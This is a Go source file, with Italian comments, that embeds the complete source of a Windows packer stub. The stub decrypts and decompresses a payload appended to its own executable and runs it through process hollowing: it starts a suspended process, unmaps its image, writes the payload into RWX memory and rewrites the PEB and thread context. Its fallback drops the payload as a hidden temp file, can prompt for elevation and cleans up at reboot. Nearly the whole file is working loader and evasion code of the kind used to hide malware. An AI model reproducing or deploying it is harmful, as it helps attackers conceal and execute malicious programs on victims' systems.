package pack

// PEStubTemplate contiene il template base per lo stub PE
// Questo codice verrà compilato e iniettato con il payload compresso/cifrato

const PEStubSource = `
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"unsafe"
	"time"
	
	"github.com/ulikunitz/xz"
	"golang.org/x/crypto/chacha20poly1305"
)

// Windows API
var (
	kernel32            = syscall.NewLazyDLL("kernel32.dll")
	ntdll               = syscall.NewLazyDLL("ntdll.dll")
	shell32             = syscall.NewLazyDLL("shell32.dll")
	advapi32            = syscall.NewLazyDLL("advapi32.dll")

	procCreateProcess    = kernel32.NewProc("CreateProcessW")
	procVirtualAllocEx   = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMem  = kernel32.NewProc("WriteProcessMemory")
	procReadProcessMem   = kernel32.NewProc("ReadProcessMemory")
	procGetThreadCtx     = kernel32.NewProc("GetThreadContext")
	procSetThreadCtx     = kernel32.NewProc("SetThreadContext")
	procResumeThread     = kernel32.NewProc("ResumeThread")
	procNtUnmapView      = ntdll.NewProc("NtUnmapViewOfSection")
	procSetFileAttrs     = kernel32.NewProc("SetFileAttributesW")
	procMoveFileEx       = kernel32.NewProc("MoveFileExW")
	procGetCurrentProcess = kernel32.NewProc("GetCurrentProcess")
	procShellExecute     = shell32.NewProc("ShellExecuteW")
	procOpenProcessToken = advapi32.NewProc("OpenProcessToken")
	procGetTokenInfo     = advapi32.NewProc("GetTokenInformation")
)

func main() {
	// 1. Read metadata and payload from end of file: [payload][metadata][metadata_size:8]
	exePath, err := os.Executable()
	if err != nil {
		os.Exit(1)
	}
	f, err := os.Open(exePath)
	if err != nil {
		os.Exit(1)
	}
	defer f.Close()

	stat, _ := f.Stat()
	fileSize := stat.Size()

	// Read metadata size (last 8 bytes)
	f.Seek(fileSize-8, 0)
	var metadataSize uint64
	binary.Read(f, binary.LittleEndian, &metadataSize)

	// Read metadata
	metadataOffset := fileSize - 8 - int64(metadataSize)
	f.Seek(metadataOffset, 0)
	metadataBytes := make([]byte, metadataSize)
	f.Read(metadataBytes)
	m := parseMetadata(metadataBytes)

	// Read encrypted payload
	payloadOffset := metadataOffset - int64(m.EncryptedSize)
	f.Seek(payloadOffset, 0)
	encryptedPayload := make([]byte, m.EncryptedSize)
	f.Read(encryptedPayload)
	f.Close()

	// 2. Decrypt
	decrypted, err := decrypt(encryptedPayload, m.Key, m.Nonce, m.EncryptionAlgo)
	if err != nil {
		os.Exit(1)
	}

	// 3. Decompress
	decompressed, err := decompress(decrypted, m.CompressionAlgo)
	if err != nil {
		os.Exit(1)
	}

	// 3.5. Remove any random padding using OriginalSize (if present)
	payload := trimToOriginal(decompressed, m.OriginalSize)

	// 4. Execute
	if m.UseInMemory {
		executeProcessHollowing(payload)
	} else {
		executeFromTemp(payload)
	}
}

type Metadata struct {
	OriginalSize    uint64
	CompressedSize  uint64
	EncryptedSize   uint64
	CompressionAlgo string
	EncryptionAlgo  string
	Key             []byte
	Nonce           []byte
	UseInMemory     bool
}

func parseMetadata(data []byte) *Metadata {
	r := bytes.NewReader(data)
	m := &Metadata{}

	binary.Read(r, binary.LittleEndian, &m.OriginalSize)
	binary.Read(r, binary.LittleEndian, &m.CompressedSize)
	binary.Read(r, binary.LittleEndian, &m.EncryptedSize)

	compAlgo := make([]byte, 16)
	r.Read(compAlgo)
	m.CompressionAlgo = string(bytes.TrimRight(compAlgo, "\x00"))

	encAlgo := make([]byte, 16)
	r.Read(encAlgo)
	m.EncryptionAlgo = string(bytes.TrimRight(encAlgo, "\x00"))

	var keySize, nonceSize uint32
	binary.Read(r, binary.LittleEndian, &keySize)
	if keySize > 0 {
		m.Key = make([]byte, keySize)
		r.Read(m.Key)
	}
	binary.Read(r, binary.LittleEndian, &nonceSize)
	if nonceSize > 0 {
		m.Nonce = make([]byte, nonceSize)
		r.Read(m.Nonce)
	}
	b, _ := r.ReadByte()
	m.UseInMemory = (b == 1)
	return m
}

// decrypt decifra il payload
func decrypt(data, key, nonce []byte, algo string) ([]byte, error) {
	switch algo {
	case "xor":
		return decryptXOR(data, key), nil
	case "aes-256-gcm":
		return decryptAES(data, key, nonce)
	case "chacha20":
		return decryptChaCha(data, key, nonce)
	case "none":
		return data, nil
	default:
		return nil, nil
	}
}

func decryptXOR(data, key []byte) []byte {
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

func decryptAES(data, key, nonce []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	return gcm.Open(nil, nonce, data, nil)
}

func decryptChaCha(data, key, nonce []byte) ([]byte, error) {
	aead, err := chacha20poly1305.New(key)
	if err != nil {
		return nil, err
	}
	return aead.Open(nil, nonce, data, nil)
}

// decompress decomprime il payload
func decompress(data []byte, algo string) ([]byte, error) {
	switch algo {
	case "xz", "lzma":
		r, err := xz.NewReader(bytes.NewReader(data))
		if err != nil {
			return nil, err
		}
		return io.ReadAll(r)
	case "none":
		return data, nil
	default:
		return nil, nil
	}
}

func removePadding(data []byte, offsets []int) []byte {
	if len(offsets) == 0 {
		return data
	}
	// Implementazione semplificata
	return data
}

// trimToOriginal slices the decompressed buffer back to the original payload size.
// When random padding is enabled during packing, padding bytes are added split
// before and after the original. We can reconstruct the original by taking the
// middle slice of length originalSize.
func trimToOriginal(data []byte, originalSize uint64) []byte {
	if originalSize == 0 {
		return data
	}
	total := uint64(len(data))
	if total == originalSize {
		return data
	}
	if total > originalSize {
		extra := total - originalSize
		front := int(extra / 2)
		start := front
		end := start + int(originalSize)
		if start >= 0 && end <= len(data) && end >= start {
			return data[start:end]
		}
	}
	// Fallback if sizes are unexpected
	return data
}

// executeProcessHollowing esegue il payload usando Process Hollowing
// Tecnica: crea processo sospeso, unmap originale, mappa nuovo PE, resume
func executeProcessHollowing(payload []byte) {
	// 1. Parse PE headers
	if len(payload) < 0x1000 {
		executeFromTemp(payload)
		return
	}
	
	// DOS Header check
	if payload[0] != 'M' || payload[1] != 'Z' {
		executeFromTemp(payload)
		return
	}
	
	// Get PE offset
	peOffset := binary.LittleEndian.Uint32(payload[0x3C:])
	if peOffset > uint32(len(payload)-4) {
		executeFromTemp(payload)
		return
	}
	
	// PE signature check
	if string(payload[peOffset:peOffset+4]) != "PE\x00\x00" {
		executeFromTemp(payload)
		return
	}
	
	// Parse Optional Header
	optHeaderOffset := peOffset + 24 // sizeof(IMAGE_FILE_HEADER)
	imageBase := binary.LittleEndian.Uint64(payload[optHeaderOffset+24:])
	sizeOfImage := binary.LittleEndian.Uint32(payload[optHeaderOffset+56:])
	addressOfEntryPoint := binary.LittleEndian.Uint32(payload[optHeaderOffset+16:])
	
	// 2. Crea processo sospeso
	exePath, _ := os.Executable()
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))
	
	// CREATE_SUSPENDED = 0x4
	err := createProcess(
		syscall.StringToUTF16Ptr(exePath),
		nil,
		nil,
		nil,
		false,
		0x4,
		nil,
		nil,
		&si,
		&pi,
	)
	if err != nil {
		executeFromTemp(payload)
		return
	}
	
	// 3. Get thread context per accesso PEB
	// Full CONTEXT structure (1232 bytes per x64)
	ctx := make([]byte, 1232)
	// Set CONTEXT_INTEGER flag (0x00100000 | 0x00000002) at offset 48
	binary.LittleEndian.PutUint32(ctx[48:], 0x00100002)
	
	ret, _, _ := procGetThreadCtx.Call(
		uintptr(pi.Thread),
		uintptr(unsafe.Pointer(&ctx[0])),
	)
	if ret == 0 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}
	
	// 4. Extract Rdx (pointer to PEB) - offset 136 in CONTEXT
	Rdx := binary.LittleEndian.Uint64(ctx[136:])
	
	// 5. Read actual ImageBase from PEB+16
	baseAddrBytes := make([]byte, 8)
	var bytesRead uintptr
	ret, _, _ = procReadProcessMem.Call(
		uintptr(pi.Process),
		uintptr(Rdx+16),
		uintptr(unsafe.Pointer(&baseAddrBytes[0])),
		8,
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 || bytesRead != 8 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}
	baseAddr := binary.LittleEndian.Uint64(baseAddrBytes)
	
	// 6. Unmap processo originale
	ret, _, _ = procNtUnmapView.Call(uintptr(pi.Process), uintptr(baseAddr))
	if ret != 0 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}
	
	// 7. Alloca memoria per nuovo PE (prova prima imageBase, poi baseAddr)
	newBase, _, _ := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		uintptr(imageBase),
		uintptr(sizeOfImage),
		0x3000, // MEM_COMMIT | MEM_RESERVE
		0x40,   // PAGE_EXECUTE_READWRITE
	)
	
	if newBase == 0 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}
	
	// 8. Scrivi headers con error check
	if !writeProcessMemoryChecked(pi.Process, newBase, payload[:0x1000]) {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}
	
	// 9. Scrivi sezioni PE con error check
	numberOfSections := binary.LittleEndian.Uint16(payload[peOffset+6:])
	sectionTableOffset := optHeaderOffset + 240 // sizeof(IMAGE_OPTIONAL_HEADER64)
	
	for i := uint16(0); i < numberOfSections; i++ {
		sectionOffset := sectionTableOffset + (uint32(i) * 40) // sizeof(IMAGE_SECTION_HEADER)
		if sectionOffset+40 > uint32(len(payload)) {
			break
		}
		
		virtualAddress := binary.LittleEndian.Uint32(payload[sectionOffset+12:])
		sizeOfRawData := binary.LittleEndian.Uint32(payload[sectionOffset+16:])
		pointerToRawData := binary.LittleEndian.Uint32(payload[sectionOffset+20:])
		
		if pointerToRawData > 0 && sizeOfRawData > 0 {
			end := pointerToRawData + sizeOfRawData
			if end <= uint32(len(payload)) {
				sectionData := payload[pointerToRawData:end]
				if !writeProcessMemoryChecked(pi.Process, newBase+uintptr(virtualAddress), sectionData) {
					syscall.TerminateProcess(pi.Process, 1)
					executeFromTemp(payload)
					return
				}
			}
		}
	}
	
	// 10. Update PEB con nuovo ImageBase (CRITICO)
	newBaseBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(newBaseBytes, uint64(newBase))
	var bytesWritten uintptr
	ret, _, _ = procWriteProcessMem.Call(
		uintptr(pi.Process),
		uintptr(Rdx+16), // PEB+16 = ImageBaseAddress
		uintptr(unsafe.Pointer(&newBaseBytes[0])),
		8,
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 || bytesWritten != 8 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}
	
	// 11. Modifica RCX (entry point) nel context - offset 128 per x64
	binary.LittleEndian.PutUint64(ctx[128:], uint64(newBase)+uint64(addressOfEntryPoint))
	
	ret, _, _ = procSetThreadCtx.Call(
		uintptr(pi.Thread),
		uintptr(unsafe.Pointer(&ctx[0])),
	)
	if ret == 0 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}
	
 // 12. Resume thread
	procResumeThread.Call(uintptr(pi.Thread))
}

// executeFromTemp esegue il payload da file temporaneo (preferibilmente nella stessa cartella dell'eseguibile impacchettato)
func executeFromTemp(payload []byte) {
	// Determina la directory del binario impacchettato
	exePath, _ := os.Executable()
	dir := ""
	if exePath != "" {
		dir = filepath.Dir(exePath)
	}

	// Prova a creare l'eseguibile temporaneo nella stessa directory del pacchetto
	var tmp *os.File
	var err error
	if dir != "" {
		tmp, err = os.CreateTemp(dir, ".~tmp-*.exe")
	}
	// Fallback: usa la directory temporanea di sistema
	if err != nil || tmp == nil {
		tmp, err = os.CreateTemp("", ".tmp-*.exe")
		if err != nil {
			os.Exit(1)
		}
	}
	tmpPath := tmp.Name()

	_, _ = tmp.Write(payload)
	_ = tmp.Close()

	// Nascondi e marca come temporaneo per ridurre visibilità
	if p := syscall.StringToUTF16Ptr(tmpPath); p != nil {
		const FILE_ATTRIBUTE_HIDDEN = 0x2
		const FILE_ATTRIBUTE_TEMPORARY = 0x100
		_, _, _ = procSetFileAttrs.Call(uintptr(unsafe.Pointer(p)), uintptr(FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_TEMPORARY))
	}

	// Se il payload richiede privilegi elevati e il processo corrente non è elevato,
	// usa ShellExecuteW con verbo "runas" per lanciare con UAC
	if !isProcessElevated() && payloadRequiresAdmin(payload) {
		params := buildCmdline(os.Args[1:])
		var dirPtr *uint16
		if dir != "" {
			dirPtr = syscall.StringToUTF16Ptr(dir)
		}
		r, _, _ := procShellExecute.Call(
			0,
			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("runas"))),
			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(tmpPath))),
			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(params))),
			uintptr(unsafe.Pointer(dirPtr)),
			uintptr(1), // SW_SHOWNORMAL
		)
		if r > 32 {
			// Cleanup non bloccante: il file sarà in uso finché il processo elevato è attivo
			cleanupTempFile(tmpPath)
			return
		}
		// fallback a esecuzione non elevata se ShellExecute fallisce
	}

	cmd := exec.Command(tmpPath, os.Args[1:]...)
	if dir != "" {
		cmd.Dir = dir
	}
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	_ = cmd.Run()

	cleanupTempFile(tmpPath)
}

// cleanupTempFile rimuove il file temporaneo con retry e, se necessario, pianifica la cancellazione al reboot
func cleanupTempFile(path string) {
	deleteWithRetries := func(p string) bool {
		for i := 0; i < 50; i++ { // ~10s total at 200ms intervals
			if err := os.Remove(p); err == nil {
				return true
			}
			time.Sleep(200 * time.Millisecond)
		}
		return false
	}
	if !deleteWithRetries(path) {
		const MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
		pOld := syscall.StringToUTF16Ptr(path)
		_, _, _ = procMoveFileEx.Call(uintptr(unsafe.Pointer(pOld)), uintptr(0), uintptr(MOVEFILE_DELAY_UNTIL_REBOOT))
	}
}

// buildCmdline unisce gli argomenti in una stringa semplice (quoting minimale)
func buildCmdline(args []string) string {
	if len(args) == 0 {
		return ""
	}
	// Nota: per semplicità non gestiamo escaping complesso
	// Se servono argomenti con spazi, Windows li accetta con doppi apici
	var buf bytes.Buffer
	for i, a := range args {
		if i > 0 {
			buf.WriteByte(' ')
		}
		needsQuote := false
		for j := 0; j < len(a); j++ {
			c := a[j]
			if c == ' ' || c == '\t' || c == '"' {
				needsQuote = true
				break
			}
		}
		if needsQuote {
			buf.WriteByte('"')
			for j := 0; j < len(a); j++ {
				if a[j] == '"' {
					buf.WriteByte('\\')
				}
				buf.WriteByte(a[j])
			}
			buf.WriteByte('"')
		} else {
			buf.WriteString(a)
		}
	}
	return buf.String()
}

// payloadRequiresAdmin prova a rilevare dal manifest se è richiesta elevazione UAC
func payloadRequiresAdmin(payload []byte) bool {
	// Heuristics: cerca stringhe del manifest comunemente presenti
	if bytes.Contains(payload, []byte("requireAdministrator")) {
		return true
	}
	// Alcune app usano highestAvailable; in ambienti admin può comunque mostrare UAC
	if bytes.Contains(payload, []byte("requestedExecutionLevel")) && bytes.Contains(payload, []byte("highestAvailable")) {
		return true
	}
	return false
}

// isProcessElevated verifica se il processo corrente è già elevato (Admin)
func isProcessElevated() bool {
	// OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)
	const TOKEN_QUERY = 0x0008
	const TokenElevation = 20
	var token syscall.Token
	// Obtain current process handle via Kernel32!GetCurrentProcess to avoid syscall API signature differences
	ph, _, _ := procGetCurrentProcess.Call()
	r1, _, _ := procOpenProcessToken.Call(
		ph,
		uintptr(TOKEN_QUERY),
		uintptr(unsafe.Pointer(&token)),
	)
	if r1 == 0 {
		return false
	}
	defer token.Close()
	var elevation uint32
	var outLen uint32
	procGetTokenInfo.Call(
		uintptr(token),
		uintptr(TokenElevation),
		uintptr(unsafe.Pointer(&elevation)),
		uintptr(4),
		uintptr(unsafe.Pointer(&outLen)),
	)
	return elevation != 0
}

// Helper functions con error checking

func createProcess(name *uint16, cmdLine *uint16, procAttr, threadAttr *syscall.SecurityAttributes,
	inheritHandles bool, flags uint32, env *uint16, dir *uint16,
	si *syscall.StartupInfo, pi *syscall.ProcessInformation) error {
	
	r1, _, e1 := procCreateProcess.Call(
		uintptr(unsafe.Pointer(name)),
		uintptr(unsafe.Pointer(cmdLine)),
		uintptr(unsafe.Pointer(procAttr)),
		uintptr(unsafe.Pointer(threadAttr)),
		boolToUintptr(inheritHandles),
		uintptr(flags),
		uintptr(unsafe.Pointer(env)),
		uintptr(unsafe.Pointer(dir)),
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(pi)),
	)
	if r1 == 0 {
		return e1
	}
	return nil
}

func writeProcessMemoryChecked(process syscall.Handle, base uintptr, data []byte) bool {
	var written uintptr
	ret, _, _ := procWriteProcessMem.Call(
		uintptr(process),
		base,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
	)
	return ret != 0 && written == uintptr(len(data))
}

func boolToUintptr(b bool) uintptr {
	if b {
		return 1
	}
	return 0
}
`

// GetPEStubSource ritorna il codice sorgente dello stub PE
func GetPEStubSource() string {
	return PEStubSource
}
